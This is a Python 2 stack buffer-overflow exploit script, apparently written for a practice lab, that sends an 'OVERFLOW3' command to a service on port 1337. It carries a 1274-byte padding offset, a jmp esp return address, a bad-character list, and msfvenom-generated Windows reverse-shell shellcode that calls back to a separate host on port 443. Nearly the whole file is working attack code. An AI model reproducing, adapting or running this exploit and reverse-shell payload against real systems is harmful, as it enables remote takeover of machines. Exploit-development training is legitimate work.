#!/usr/bin/python

import socket, time

remoteip="10.10.80.67"
remoteport=1337
offset = "A" * 1274
#jmp esp 62501203
eip = "\x03\x12\x50\x62"
#badchars \x00\x11\x40\x5f\xb8\xee
#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x11\x40\x5f\xb8\xee" -v esp -f python
esp =  b"\x90" * 16
esp += b"\xfc\xbb\x37\x93\x27\x6f\xeb\x0c\x5e\x56\x31\x1e\xad"
esp += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xcb"
esp += b"\x7b\xa5\x6f\x33\x7c\xca\xe6\xd6\x4d\xca\x9d\x93\xfe"
esp += b"\xfa\xd6\xf1\xf2\x71\xba\xe1\x81\xf4\x13\x06\x21\xb2"
esp += b"\x45\x29\xb2\xef\xb6\x28\x30\xf2\xea\x8a\x09\x3d\xff"
esp += b"\xcb\x4e\x20\xf2\x99\x07\x2e\xa1\x0d\x23\x7a\x7a\xa6"
esp += b"\x7f\x6a\xfa\x5b\x37\x8d\x2b\xca\x43\xd4\xeb\xed\x80"
esp += b"\x6c\xa2\xf5\xc5\x49\x7c\x8e\x3e\x25\x7f\x46\x0f\xc6"
esp += b"\x2c\xa7\xbf\x35\x2c\xe0\x78\xa6\x5b\x18\x7b\x5b\x5c"
esp += b"\xdf\x01\x87\xe9\xfb\xa2\x4c\x49\x27\x52\x80\x0c\xac"
esp += b"\x58\x6d\x5a\xea\x7c\x70\x8f\x81\x79\xf9\x2e\x45\x08"
esp += b"\xb9\x14\x41\x50\x19\x34\xd0\x3c\xcc\x49\x02\x9f\xb1"
esp += b"\xef\x49\x32\xa5\x9d\x10\x5b\x0a\xac\xaa\x9b\x04\xa7"
esp += b"\xd9\xa9\x8b\x13\x75\x82\x44\xba\x82\xe5\x7e\x7a\x1c"
esp += b"\x18\x81\x7b\x35\xdf\xd5\x2b\x2d\xf6\x55\xa0\xad\xf7"
esp += b"\x83\x67\xfd\x57\x7c\xc8\xad\x17\x2c\xa0\xa7\x97\x13"
esp += b"\xd0\xc8\x7d\x3c\x7b\x33\x16\x49\x71\x15\x3f\x25\x8b"
esp += b"\x69\xbe\x0d\x02\x8f\xaa\x61\x43\x18\x43\x1b\xce\xd2"
esp += b"\xf2\xe4\xc4\x9f\x35\x6e\xeb\x60\xfb\x87\x86\x72\x6c"
esp += b"\x68\xdd\x28\x3b\x77\xcb\x44\xa7\xea\x90\x94\xae\x16"
esp += b"\x0f\xc3\xe7\xe9\x46\x81\x15\x53\xf1\xb7\xe7\x05\x3a"
esp += b"\x73\x3c\xf6\xc5\x7a\xb1\x42\xe2\x6c\x0f\x4a\xae\xd8"
esp += b"\xdf\x1d\x78\xb6\x99\xf7\xca\x60\x70\xab\x84\xe4\x05"
esp += b"\x87\x16\x72\x0a\xc2\xe0\x9a\xbb\xbb\xb4\xa5\x74\x2c"
esp += b"\x31\xde\x68\xcc\xbe\x35\x29\xec\x5c\x9f\x44\x85\xf8"
esp += b"\x4a\xe5\xc8\xfa\xa1\x2a\xf5\x78\x43\xd3\x02\x60\x26"
esp += b"\xd6\x4f\x26\xdb\xaa\xc0\xc3\xdb\x19\xe0\xc1\xdb\x9d"
esp += b"\x1e\xea"
buffer = offset + eip + esp

while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    s.send("OVERFLOW3 " + buffer + '\r\n')
    print s.recv(1024)
    s.close()
    print "-------------------------"
